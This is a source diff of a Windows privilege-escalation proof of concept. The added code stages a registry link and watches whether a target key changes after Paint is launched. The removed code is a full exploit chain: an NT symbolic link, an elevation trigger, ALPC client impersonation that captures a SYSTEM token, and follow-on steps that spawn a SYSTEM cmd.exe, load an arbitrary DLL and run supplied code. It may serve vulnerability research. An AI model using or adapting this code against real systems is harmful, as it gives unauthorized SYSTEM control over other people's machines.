+        *notifyEvent = NULL;
+    }
+    if (notifyError) {
+        *notifyError = ERROR_SUCCESS;
+    }
+
+    res = RegOpenKeyExW(HKEY_CURRENT_USER, targetSubKey, 0, KEY_NOTIFY | KEY_READ, notifyKey);
+    if (res != ERROR_SUCCESS) {
+        if (notifyError) {
+            *notifyError = res;
+        }
+        return false;
+    }
+
+    *notifyEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
+    if (!*notifyEvent) {
+        res = GetLastError();
+        RegCloseKey(*notifyKey);
+        *notifyKey = NULL;
+        if (notifyError) {
+            *notifyError = res;
+        }
+        return false;
+    }
+
+    res = RegNotifyChangeKeyValue(
+        *notifyKey,
+        TRUE,
+        REG_NOTIFY_CHANGE_NAME | REG_NOTIFY_CHANGE_ATTRIBUTES | REG_NOTIFY_CHANGE_LAST_SET | REG_NOTIFY_CHANGE_SECURITY,
+        *notifyEvent,
+        TRUE);
+    if (notifyError) {
+        *notifyError = res;
+    }
+    if (res != ERROR_SUCCESS) {
+        CloseHandle(*notifyEvent);
+        *notifyEvent = NULL;
+        RegCloseKey(*notifyKey);
+        *notifyKey = NULL;
+        return false;
+    }
+    return true;
+}
+
+static int RunPaintHamPoc(int argc, wchar_t** argv)
+{
+    GpRequest request = { 0 };
+    GpTargetBoundary boundary = { 0 };
+    GpSourceControl source = { 0 };
+    GpRegistrySnapshot before = { 0 };
+    GpRegistrySnapshot after = { 0 };
+    wchar_t nativeTarget[1024] = { 0 };
+    HKEY notifyKey = NULL;
+    HANDLE notifyEvent = NULL;
+    DWORD notifyError = ERROR_SUCCESS;
+    DWORD waitResult = WAIT_TIMEOUT;
+    bool parseOk = false;
+    bool snapshotBeforeOk = false;
+    bool snapshotAfterOk = false;
+    bool targetPreconditionOk = false;
+    bool stageOk = false;
+    bool rollbackOk = false;
+    bool notifyArmed = false;
+    bool targetMutated = false;
+    bool changed = false;
+    const wchar_t* reason = L"unknown";
+    int exitCode = 1;
+
+    parseOk = ParseOptions(argc, argv, &request);
+    if (!parseOk) {
+        return 1;
+    }
+
+    (void)CaptureTokenEvidence();
     wprintf(
-        L"sink=%ls implemented=%u pre=%ls reason=%ls\n",
-        name,
-        result.implemented ? 1 : 0,
-        GpStatusName(result.preconditionStatus),
-        result.reason ? result.reason : L"<none>");
-}
+        L"paint_ham_poc_start source=%ls target=%ls trigger_mode=%ls observe_ms=%lu settle_ms=%lu\n",
+        GP_PAINT_HAM_SOURCE,
+        request.targetSubKey,
+        TriggerModeName(request.triggerMode),
+        request.observeMs,
+        request.settleMs);
 
-static bool CheckTokenSinkPreconditions(const GpRunEvidence& evidence, GpBlockedSinkResult* result)
-{
-    if (!result) {
-        return false;
+    boundary = CheckTargetBoundary(request.targetSubKey);
+    source = CheckSourceControl();
+    wprintf(
+        L"candidate_pair source=%ls target=%ls result=%ls reason=%ls\n",
+        GP_PAINT_HAM_SOURCE,
+        request.targetSubKey,
+        (boundary.keep && source.keep) ? L"keep" : L"reject",
+        !boundary.keep ? L"target-boundary-failed" : (!source.keep ? L"source-control-failed" : L"source-target-keep"));
+    if (!boundary.keep) {
+        reason = boundary.reason;
+        goto summary;
+    }
+    if (!source.keep) {
+        reason = source.reason;
+        goto summary;
     }
 
-    GpStatus preStatus = PrimitivePrecondition(evidence);
-    if (preStatus != GpStatus::Ok) {
-        result->preconditionStatus = preStatus;
-        result->reason = L"precondition-failed";
-        return false;
+    snapshotBeforeOk = CaptureSnapshot(request.targetSubKey, L"before", &before);
+    if (!snapshotBeforeOk) {
+        reason = L"target-snapshot-failed";
+        goto cleanup;
     }
-
-    if (!evidence.capturedSystemToken) {
-        result->preconditionStatus = GpStatus::AccessDenied;
-        result->reason = L"no-system-token-available";
-        return false;
+    if (before.mixedPresent) {
+        wprintf(
+            L"target_precondition result=reject reason=mixed-already-present target=%ls mixed_type=%lu mixed_qword_valid=%u mixed_qword=0x%016llx\n",
+            request.targetSubKey,
+            before.mixedType,
+            before.mixedQwordValid ? 1 : 0,
+            (unsigned long long)before.mixedQword);
+        reason = L"mixed-already-present";
+        goto cleanup;
     }
+    targetPreconditionOk = true;
+    wprintf(L"target_precondition result=keep reason=mixed-absent target=%ls\n", request.targetSubKey);
 
-    return true;
-}
-
-static GpBlockedSinkResult SelectPrimarySinkResult(
-    const GpBlockedSinkResult& alpc,
-    const GpBlockedSinkResult& shell,
-    const GpBlockedSinkResult& dll,
-    const GpBlockedSinkResult& code)
-{
-    if (code.preconditionStatus == GpStatus::Ok) {
-        return code;
-    }
-    if (dll.preconditionStatus == GpStatus::Ok) {
-        return dll;
-    }
-    if (shell.preconditionStatus == GpStatus::Ok) {
-        return shell;
-    }
-    if (alpc.preconditionStatus != GpStatus::Ok) {
-        return alpc;
-    }
-    if (code.preconditionStatus != GpStatus::Skipped) {
-        return code;
-    }
-    if (dll.preconditionStatus != GpStatus::Skipped) {
-        return dll;
-    }
-    if (shell.preconditionStatus != GpStatus::Skipped) {
-        return shell;
-    }
-    return alpc;
-}
-
-static void BlockRequestedTokenSinks(
-    const GpSinkRequest& request,
-    GpStatus preconditionStatus,
-    GpBlockedSinkResult* shell,
-    GpBlockedSinkResult* dll,
-    GpBlockedSinkResult* code)
-{
-    if (request.requestSystemShell && shell) {
-        *shell = MakeBlockedSinkResult(preconditionStatus);
-    }
-    if (request.requestDllLoad && dll) {
-        *dll = MakeBlockedSinkResult(preconditionStatus);
-    }
-    if (request.requestCodeExecution && code) {
-        *code = MakeBlockedSinkResult(preconditionStatus);
-    }
-}
-
-/*
- * Sink boundaries. ALPC captures the primary token; follow-on sinks use that
- * token without taking ownership. Cleanup owns the final token close.
- */
-
-static GpBlockedSinkResult SystemShell(const GpRunEvidence& evidence)
-{
-    GpBlockedSinkResult result = { false, L"setup-failed", GpStatus::TriggerFailed };
-
-    if (!CheckTokenSinkPreconditions(evidence, &result)) {
-        return result;
-    }
-
-    HANDLE hToken = evidence.capturedSystemToken;
-    STARTUPINFOW si = { sizeof(si) };
-    PROCESS_INFORMATION pi = { 0 };
-    si.lpDesktop = (LPWSTR)L"Winsta0\\Default";
-
-    if (CreateProcessAsUserW(hToken, L"C:\\Windows\\System32\\cmd.exe", 
-                             NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
-        result.implemented = true;
-        result.reason = L"system-shell-spawned";
-        result.preconditionStatus = GpStatus::Ok;
-        
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    } else {
-        result.reason = L"create-process-failed";
-    }
-
-    return result;
-}
-
-static GpBlockedSinkResult DllLoad(const GpRunEvidence& evidence, const wchar_t* requestedDllPath)
-{
-    GpBlockedSinkResult result = { false, L"setup-failed", GpStatus::TriggerFailed };
-
-    if (!requestedDllPath || !requestedDllPath[0]) {
-        result.preconditionStatus = GpStatus::InvalidInput;
-        result.reason = L"invalid-dll-path";
-        return result;
-    }
-    if (wcscmp(requestedDllPath, GP_BLOCKED_DLL_REQUEST) == 0) {
-        return MakeSkippedSinkResult(L"dll-not-requested");
-    }
-
-    if (!CheckTokenSinkPreconditions(evidence, &result)) {
-        return result;
-    }
-
-    wchar_t commandLine[MAX_PATH * 2];
-    if (swprintf_s(
-            commandLine,
-            sizeof(commandLine) / sizeof(wchar_t),
-            L"C:\\Windows\\System32\\rundll32.exe \"%ls\",DllMain",
-            requestedDllPath) < 0) {
-        result.preconditionStatus = GpStatus::InvalidInput;
-        result.reason = L"dll-command-too-long";
-        return result;
-    }
-
-    HANDLE hToken = evidence.capturedSystemToken;
-    STARTUPINFOW si = { sizeof(si) };
-    PROCESS_INFORMATION pi = { 0 };
-    si.lpDesktop = (LPWSTR)L"Winsta0\\Default";
-
-    if (CreateProcessAsUserW(
-        hToken,
-        NULL,
-        commandLine,
-        NULL,
-        NULL,
-        FALSE,
-        CREATE_NEW_CONSOLE,
-        NULL,
-        NULL,
-        &si,
-        &pi
-    )) {
-        result.implemented = true;
-        result.reason = L"dll-loaded-via-rundll32";
-        result.preconditionStatus = GpStatus::Ok;
-        
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    } else {
-        result.reason = L"create-process-failed";
-    }
-
-    return result;
-}
-
-static bool IsExecutableAddress(const void* address)
-{
-    if (!address) {
-        return false;
-    }
-
-    MEMORY_BASIC_INFORMATION mbi = { 0 };
-    if (VirtualQuery(address, &mbi, sizeof(mbi)) == 0) {
-        return false;
-    }
-
-    if (mbi.State != MEM_COMMIT || (mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS)) != 0) {
-        return false;
-    }
-
-    DWORD protect = mbi.Protect & ~(PAGE_GUARD | PAGE_NOCACHE | PAGE_WRITECOMBINE);
-    return protect == PAGE_EXECUTE ||
-        protect == PAGE_EXECUTE_READ ||
-        protect == PAGE_EXECUTE_READWRITE ||
-        protect == PAGE_EXECUTE_WRITECOPY;
-}
-
-static GpBlockedSinkResult AlpcTokenCapture(GpRunEvidence& evidence, const wchar_t* requestedPortName)
-{
-    NTSTATUS status;
-    HANDLE hServerPort = NULL;
-    HANDLE hConnPort = NULL;
-    bool impersonated = false;
-    
-    GpBlockedSinkResult result = { false, L"setup-failed", GpStatus::MutationFailed };
-
-    if (!requestedPortName || !requestedPortName[0]) {
-        result.preconditionStatus = GpStatus::InvalidInput;
-        result.reason = L"invalid-port-name";
-        return result;
-    }
-
-    GpStatus preStatus = AlpcPrecondition(evidence);
-    if (preStatus != GpStatus::Ok) {
-        result.preconditionStatus = preStatus;
-        result.reason = L"precondition-failed";
-        return result;
-    }
-
-    if (!_NtAlpcCreatePort || !_NtAlpcSendWaitReceivePort || !_NtAlpcAcceptConnectPort || !_NtAlpcImpersonateClientOfPort) {
-        result.preconditionStatus = GpStatus::LinkFailed;
-        result.reason = L"api-not-resolved";
-        return result;
-    }
-
-    OBJECT_ATTRIBUTES objAttr;
-    UNICODE_STRING portName;
-    RtlInitUnicodeString(&portName, requestedPortName);
-    InitializeObjectAttributes(&objAttr, &portName, 0, NULL, NULL);
-
-    ALPC_PORT_ATTRIBUTES portAttr = { 0 };
-    portAttr.MaxMessageLength = sizeof(ALPC_MESSAGE);
-    portAttr.Flags = ALPC_PORT_ALLOW_IMPERSONATION;
-    portAttr.SecurityQos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
-    portAttr.SecurityQos.ImpersonationLevel = SecurityImpersonation;
-    portAttr.SecurityQos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
-    portAttr.SecurityQos.EffectiveOnly = FALSE;
-
-    status = _NtAlpcCreatePort(&hServerPort, &objAttr, &portAttr);
-    if (!NT_SUCCESS(status)) {
-        result.preconditionStatus = GpStatus::LinkFailed;
-        result.reason = L"port-creation-failed";
-        return result;
-    }
-
-    ULONGLONG start = GetTickCount64();
-    bool connected = false;
-    ALPC_MESSAGE msg = { 0 };
-    SIZE_T msgSize = sizeof(msg);
-
-    while (GetTickCount64() - start < GP_OPEN_TIMEOUT_MS) {
-        LARGE_INTEGER timeout;
-        timeout.QuadPart = -10000LL * 100;
-        
-        ZeroMemory(&msg, sizeof(msg));
-        msgSize = sizeof(msg);
-        status = _NtAlpcSendWaitReceivePort(hServerPort, 0, NULL, NULL, (PPORT_MESSAGE)&msg, &msgSize, NULL, &timeout);
-        
-        if (status == STATUS_TIMEOUT) continue; 
-        
-        if (NT_SUCCESS(status)) {
-            if ((msg.PortHeader.u2.s2.Type & 0x0FFF) == LPC_CONNECTION_REQUEST) {
-                connected = true;
-                break;
-            }
-        }
-    }
-
-    if (!connected) {
-        result.preconditionStatus = GpStatus::SectionTimeout;
-        result.reason = L"connection-timeout";
+    stageOk = StageRegistryLink(request.targetSubKey, nativeTarget, ARRAYSIZE(nativeTarget));
+    if (!stageOk) {
+        reason = L"stage-failed";
         goto cleanup;
     }
 
-    status = _NtAlpcAcceptConnectPort(&hConnPort, hServerPort, 0, NULL, NULL, NULL, (PPORT_MESSAGE)&msg, NULL, TRUE);
-    if (!NT_SUCCESS(status)) {
-        result.preconditionStatus = GpStatus::AccessDenied;
-        result.reason = L"accept-failed";
-        goto cleanup;
-    }
+    notifyArmed = ArmTargetNotify(request.targetSubKey, &notifyKey, &notifyEvent, &notifyError);
+    wprintf(
+        L"target_notify armed=%u subtree=1 filters=name|last_set|security|attributes W32=0x%08lx\n",
+        notifyArmed ? 1 : 0,
+        notifyError);
 
-    status = _NtAlpcImpersonateClientOfPort(hConnPort, (PPORT_MESSAGE)&msg, NULL);
-    if (!NT_SUCCESS(status)) {
-        result.preconditionStatus = GpStatus::AccessDenied;
-        result.reason = L"impersonation-failed";
-        goto cleanup;
-    }
-    impersonated = true;
-
-    HANDLE hToken = NULL;
-    if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, TRUE, &hToken)) {
-        
-        SECURITY_IMPERSONATION_LEVEL impLevel;
-        DWORD returnLength = 0;
-        
-        if (GetTokenInformation(hToken, TokenImpersonationLevel, &impLevel, sizeof(impLevel), &returnLength) && 
-            impLevel >= SecurityImpersonation) {
-            
-            HANDLE hPrimaryToken = NULL;
-            if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) {
-                
-                DWORD sessionID = evidence.sessionId;
-                if (!SetTokenInformation(hPrimaryToken, TokenSessionId, &sessionID, sizeof(sessionID))) {
-                    CloseHandle(hPrimaryToken);
-                    result.preconditionStatus = GpStatus::AccessDenied;
-                    result.reason = L"token-session-update-failed";
-                    goto token_done;
-                }
-
-                if (evidence.capturedSystemToken) {
-                    CloseHandle(evidence.capturedSystemToken);
-                }
-                evidence.capturedSystemToken = hPrimaryToken;
-                result.implemented = true;
-                result.reason = L"system-token-captured";
-                result.preconditionStatus = GpStatus::Ok;
-            } else {
-                result.reason = L"token-duplicate-failed";
-            }
-        } else {
-            result.reason = L"insufficient-impersonation-level";
-        }
-token_done:
-        CloseHandle(hToken);
-    } else {
-        result.reason = L"open-thread-token-failed";
-    }
-
-    if (impersonated && !RevertToSelf()) {
-        if (result.preconditionStatus == GpStatus::Ok) {
-            result.preconditionStatus = GpStatus::AccessDenied;
-            result.reason = L"revert-failed";
-            result.implemented = false;
-        }
-    }
-
-cleanup:
-    if (hConnPort) CloseHandle(hConnPort);
-    if (hServerPort) CloseHandle(hServerPort);
-    return result;
-}
-
-static GpBlockedSinkResult CodeExecution(const GpRunEvidence& evidence, const void* requestedEntryPoint)
-{
-    GpBlockedSinkResult result = { false, L"setup-failed", GpStatus::TriggerFailed };
-    typedef void(*EntryPointFunc)();
-
-    if (!requestedEntryPoint) {
-        result.preconditionStatus = GpStatus::InvalidInput;
-        result.reason = L"invalid-entry-point";
-        return result;
-    }
-
-    if (!IsExecutableAddress(requestedEntryPoint)) {
-        result.preconditionStatus = GpStatus::InvalidInput;
-        result.reason = L"entry-point-not-executable";
-        return result;
-    }
-
-    if (!CheckTokenSinkPreconditions(evidence, &result)) {
-        return result;
-    }
-
-    if (!ImpersonateLoggedOnUser(evidence.capturedSystemToken)) {
-        result.preconditionStatus = GpStatus::AccessDenied;
-        result.reason = L"impersonation-failed";
-        return result;
-    }
-
-    EntryPointFunc func = (EntryPointFunc)requestedEntryPoint;
-    bool executed = false;
-    bool reverted = false;
-    DWORD exceptionCode = 0;
-
-    __try {
-        __try {
-            func();
-            executed = true;
-        }
-        __finally {
-            reverted = RevertToSelf() ? true : false;
-        }
-    }
-    __except ((exceptionCode = GetExceptionCode()), EXCEPTION_EXECUTE_HANDLER) {
-        UNREFERENCED_PARAMETER(exceptionCode);
-        result.preconditionStatus = GpStatus::TriggerFailed;
-        result.reason = L"entry-point-exception";
-        return result;
-    }
-
-    if (!reverted) {
-        result.preconditionStatus = GpStatus::AccessDenied;
-        result.reason = L"revert-failed";
-        return result;
-    }
-
-    result.implemented = executed;
-    result.reason = executed ? L"code-executed-via-impersonation" : L"entry-point-not-called";
-    result.preconditionStatus = executed ? GpStatus::Ok : GpStatus::TriggerFailed;
-    return result;
-}
-
-static GpBlockedSinkResult TouchBlockedSinkBoundaries(GpRunEvidence& evidence, const GpSinkRequest& request)
-{
-    const wchar_t* portName = request.alpcPortName && request.alpcPortName[0]
-        ? request.alpcPortName
-        : GP_ALPC_PORT_NAME;
-
-    GpBlockedSinkResult alpc = AlpcTokenCapture(evidence, portName);
-    GpBlockedSinkResult shell = MakeSkippedSinkResult(L"shell-not-requested");
-    GpBlockedSinkResult dll = MakeSkippedSinkResult(L"dll-not-requested");
-    GpBlockedSinkResult code = MakeSkippedSinkResult(L"code-not-requested");
-
-    if (alpc.preconditionStatus == GpStatus::Ok) {
-        if (request.requestSystemShell) {
-            shell = SystemShell(evidence);
-        }
-        if (request.requestDllLoad) {
-            dll = DllLoad(evidence, request.dllPath);
-        }
-        if (request.requestCodeExecution) {
-            code = CodeExecution(evidence, request.entryPoint);
-        }
+    if (request.triggerMode == GpTriggerMode::Manual) {
+        wprintf(
+            L"ready_for_trigger source=%ls target=%ls trigger_mode=manual observe_ms=%lu action=\"launch Paint from Start, wait, close Paint\"\n",
+            GP_PAINT_HAM_SOURCE,
+            request.targetSubKey,
+            request.observeMs);
+        wprintf(L"registry_trigger=skip method=manual elevation_claim=0\n");
     }
     else {
-        BlockRequestedTokenSinks(request, alpc.preconditionStatus, &shell, &dll, &code);
+        wprintf(
+            L"ready_for_trigger source=%ls target=%ls trigger_mode=none observe_ms=%lu action=\"no trigger; negative control\"\n",
+            GP_PAINT_HAM_SOURCE,
+            request.targetSubKey,
+            request.observeMs);
+        wprintf(L"registry_trigger=skip method=none elevation_claim=0\n");
     }
 
-    GpBlockedSinkResult primary = SelectPrimarySinkResult(alpc, shell, dll, code);
-    PrintSinkResult(L"alpc", alpc);
-    PrintSinkResult(L"shell", shell);
-    PrintSinkResult(L"dll", dll);
-    PrintSinkResult(L"code", code);
+    wprintf(L"observe_wait ms=%lu\n", request.observeMs);
+    if (notifyArmed && notifyEvent) {
+        waitResult = WaitForSingleObject(notifyEvent, request.observeMs);
+    }
+    else {
+        Sleep(request.observeMs);
+        waitResult = WAIT_TIMEOUT;
+    }
     wprintf(
-        L"sinks=checked primary_pre=%ls primary_reason=%ls\n",
-        GpStatusName(primary.preconditionStatus),
-        primary.reason ? primary.reason : L"<none>");
-    return primary;
+        L"target_notify fired=%u W32=0x%08lx\n",
+        waitResult == WAIT_OBJECT_0 ? 1 : 0,
+        waitResult);
+
+    if (waitResult == WAIT_OBJECT_0 && request.settleMs > 0) {
+        wprintf(L"settle_wait ms=%lu reason=notify-fired\n", request.settleMs);
+        Sleep(request.settleMs);
+    }
+    else {
+        wprintf(
+            L"settle_wait ms=0 reason=%ls\n",
+            waitResult == WAIT_OBJECT_0 ? L"disabled" : L"notify-not-fired");
+    }
+
+    snapshotAfterOk = CaptureSnapshot(request.targetSubKey, L"after", &after);
+    if (!snapshotAfterOk) {
+        reason = L"target-snapshot-failed";
+        goto cleanup;
+    }
+
+    changed = before.hash != after.hash ||
+        before.valueCount != after.valueCount ||
+        before.mixedPresent != after.mixedPresent ||
+        before.mixedHash != after.mixedHash;
+    targetMutated =
+        targetPreconditionOk &&
+        !before.mixedPresent &&
+        after.mixedPresent &&
+        after.mixedType == REG_QWORD &&
+        (changed || waitResult == WAIT_OBJECT_0);
+
+    wprintf(
+        L"target_registry_diff snapshot_changed=%u value_changed=%u material_changed=%u before_hash=0x%016llx after_hash=0x%016llx mixed_before=%u mixed_after=%u mixed_qword_after=0x%016llx\n",
+        before.hash != after.hash ? 1 : 0,
+        before.valueCount != after.valueCount || before.mixedHash != after.mixedHash ? 1 : 0,
+        targetMutated ? 1 : 0,
+        (unsigned long long)before.hash,
+        (unsigned long long)after.hash,
+        before.mixedPresent ? 1 : 0,
+        after.mixedPresent ? 1 : 0,
+        (unsigned long long)after.mixedQword);
+
+cleanup:
+    if (notifyKey) {
+        RegCloseKey(notifyKey);
+        notifyKey = NULL;
+    }
+    if (notifyEvent) {
+        CloseHandle(notifyEvent);
+        notifyEvent = NULL;
+    }
+    if (stageOk) {
+        rollbackOk = CleanupRegistryLink();
+    }
+
+summary:
+    if (!reason || wcscmp(reason, L"unknown") == 0) {
+        reason = !boundary.keep ? boundary.reason :
+            (!source.keep ? source.reason :
+                (!snapshotBeforeOk ? L"target-snapshot-failed" :
+                    (!targetPreconditionOk ? L"mixed-already-present" :
+                        (!stageOk ? L"stage-failed" :
+                            (!targetMutated ? L"no-effect" :
+                                (!rollbackOk ? L"rollback-not-verified" : L"writer-context-external"))))));
+    }
+
+    if (boundary.keep && source.keep && stageOk && targetMutated && rollbackOk) {
+        exitCode = 0;
+    }
+
+    wprintf(
+        L"paint_ham_poc_summary boundary=%ls source=%ls stage=%ls notify_fired=%u target_changed=%u rollback=%ls claim=%ls reason=%ls\n",
+        boundary.keep ? L"kept" : L"failed",
+        source.keep ? L"keep" : L"reject",
+        stageOk ? L"ok" : L"fail",
+        waitResult == WAIT_OBJECT_0 ? 1 : 0,
+        targetMutated ? 1 : 0,
+        rollbackOk ? L"verified" : L"not-verified",
+        targetMutated && rollbackOk ? L"target-mutated-unattributed" : L"none",
+        reason);
+
+    if (request.hold) {
+        wprintf(L"hold=key\n");
+        _getch();
+    }
+    wprintf(L"done=%ls\n", exitCode == 0 ? L"ok" : L"partial");
+    return exitCode;
 }
 
 int wmain(int argc, wchar_t** argv)
 {
-    wchar_t sourceName[MAX_PATH] = { 0 };
-    DWORD sessionId = 0;
-    SHELLEXECUTEINFOW shell = { 0 };
-    UNICODE_STRING linkSource = { 0 };
-    UNICODE_STRING linkTarget = { 0 };
-    OBJECT_ATTRIBUTES objattr = { 0 };
-    GpRunEvidence run = { 0 };
-    GpSinkRequest sinkRequest = MakeDefaultSinkRequest();
-    GpBlockedSinkResult primarySink = { false, L"blocked-by-design", GpStatus::RegistryFailed };
-    int exitCode = 1;
+    for (int i = 1; i < argc; ++i) {
+        if (argv[i] &&
+            (wcscmp(argv[i], L"--help") == 0 ||
+             wcscmp(argv[i], L"-h") == 0 ||
+             wcscmp(argv[i], L"/?") == 0)) {
+            PrintUsage();
+            return 0;
+        }
+    }
 
     if (!ResolveNativeApis()) {
         return 1;
     }
-    run.apisResolved = true;
-
-    if (!ProcessIdToSessionId(GetCurrentProcessId(), &sessionId) || sessionId == 0) {
-        TraceWin32(L"P0", L"sid", GetLastError());
-        return 1;
-    }
-    run.sessionId = sessionId;
-
-    swprintf_s(
-        sourceName,
-        GP_SESSION_SECTION_FORMAT,
-        sessionId,
-        sessionId);
-
-    const wchar_t* targetName = NULL;
-    if (!ParseCommandLineOptions(argc, argv, &targetName, &sinkRequest)) {
-        return 1;
-    }
-    run.namesBuilt = true;
-
-    RtlInitUnicodeString(&linkSource, sourceName);
-    RtlInitUnicodeString(&linkTarget, targetName);
-    InitializeObjectAttributes(&objattr, &linkSource, OBJ_CASE_INSENSITIVE, NULL, NULL);
-
-    NTSTATUS status = _NtCreateSymbolicLinkObject(&run.linkHandle, GENERIC_ALL, &objattr, &linkTarget);
-    run.linkStatus = status;
-    if (!NT_SUCCESS(status)) {
-        TraceNtStatus(L"P1", L"link", status);
-        goto cleanup;
-    }
-    run.linkCreated = true;
-    wprintf(L"link=ok\n");
-
-#ifdef STOP_AFTER_LINK
-    goto cleanup;
-#endif
-
-    shell.cbSize = sizeof(shell);
-    shell.fMask = SEE_MASK_NOZONECHECKS | SEE_MASK_ASYNCOK;
-    shell.lpVerb = L"runas";
-    shell.lpFile = L"C:\\Windows\\System32\\conhost.exe";
-    if (!ShellExecuteExW(&shell)) {
-        run.triggerWin32Error = GetLastError();
-        TraceWin32(L"P2", L"trigger", run.triggerWin32Error);
-        goto cleanup;
-    }
-    run.triggerStarted = true;
-    wprintf(L"trigger=ok\n");
-
-#ifdef STOP_AFTER_TRIGGER
-    goto cleanup;
-#endif
-
-    if (!OpenSectionWithTimeout(
-        &objattr,
-        &run.sectionHandle,
-        &run.sectionOpenStatus,
-        &run.sectionOpenElapsedMs)) {
-        goto cleanup;
-    }
-    wprintf(L"section=ok handle=0x%p ms=%lu\n", run.sectionHandle, run.sectionOpenElapsedMs);
-
-    if (CaptureGrantedAccess(run.sectionHandle, &run.grantedAccess)) {
-        PrintAccessEvidence(run.grantedAccess);
-    }
-    else {
-        wprintf(L"access=fail\n");
-    }
-    LogHandleSnapshot(L"P3", L"section", run.sectionHandle);
-
-    run.view = MapSectionView(run.sectionHandle);
-    CaptureSectionFingerprint(&run);
-    DumpSectionPrefix(&run.view);
-
-#ifdef STOP_AFTER_OPEN
-    goto cleanup;
-#endif
-
-    SetPolicyVal(&run.registry);
-    if (run.sectionHandle) {
-        LogHandleSnapshot(L"P4", L"section", run.sectionHandle);
-    }
-
-    if (run.registry.succeeded) {
-        run.lockAttempted = true;
-        if (!LockWorkStation()) {
-            run.lockWin32Error = GetLastError();
-            TraceWin32(L"P5", L"lock", run.lockWin32Error);
-        }
-        else {
-            run.lockSucceeded = true;
-            wprintf(L"lock=ok\n");
-            run.desktopTiming = WaitForDesktopTransitionWindow(L"post-lock");
-            if (!run.desktopTiming.observed) {
-                wprintf(L"section_refresh=continue reason=lock-ok timing=miss\n");
-            }
-            RefreshWritableSectionView(&run, &objattr);
-        }
-
-        ApplyAlpcPathMutation(&run, sinkRequest.alpcPortName);
-        primarySink = TouchBlockedSinkBoundaries(run, sinkRequest);
-    }
-    else {
-        primarySink = TouchBlockedSinkBoundaries(run, sinkRequest);
-    }
-    if (primarySink.preconditionStatus == GpStatus::Ok && (!run.lockAttempted || run.lockSucceeded)) {
-        exitCode = 0;
-    }
-
-    wprintf(L"hold=key\n");
-
-cleanup:
-    ReleaseSectionView(&run.view);
-
-    if (run.capturedSystemToken) {
-        CloseHandle(run.capturedSystemToken);
-        run.capturedSystemToken = NULL;
-    }
-
-    if (run.linkHandle) {
-        CloseHandle(run.linkHandle);
-        run.linkHandle = NULL;
-    }
-
-    if (run.sectionHandle) {
-        _getch();
-        CloseHandle(run.sectionHandle);
-        run.sectionHandle = NULL;
-    }
-
-    CleanupRegistryEvidence(&run.registry);
-
-    wprintf(L"done=%ls\n", exitCode == 0 ? L"ok" : L"partial");
-    return exitCode;
+    return RunPaintHamPoc(argc, argv);
 }
